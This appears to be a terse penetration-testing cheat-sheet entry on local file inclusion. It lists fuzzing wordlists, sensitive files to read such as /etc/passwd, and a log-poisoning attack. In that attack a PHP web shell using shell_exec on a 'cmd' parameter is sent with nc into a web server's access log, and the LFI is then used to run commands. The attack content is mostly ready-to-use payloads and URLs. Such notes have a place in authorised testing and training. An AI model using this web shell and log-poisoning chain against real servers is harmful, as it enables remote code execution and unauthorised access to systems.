#### Wordlists

- /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
- /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt

#### PoC

- linux

```
/etc/passwd
```

- windows 

```
c:\windows\system32\drivers\etc\hosts
```

#### Log Poisoning 

First, we poison the logs by connecting using nc and sending the payload.
```
nc -nv $IP 80
<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>
```

Then, we trigger the LFI and submit the command we want executed to the cmd parameter.
```
https://$IP/vuln.php?file=C:\xampp\apache\logs\access.log&cmd=whoami
```

#### Proc

- https://www.netspi.com/blog/technical/web-application-penetration-testing/directory-traversal-file-inclusion-proc-file-system/
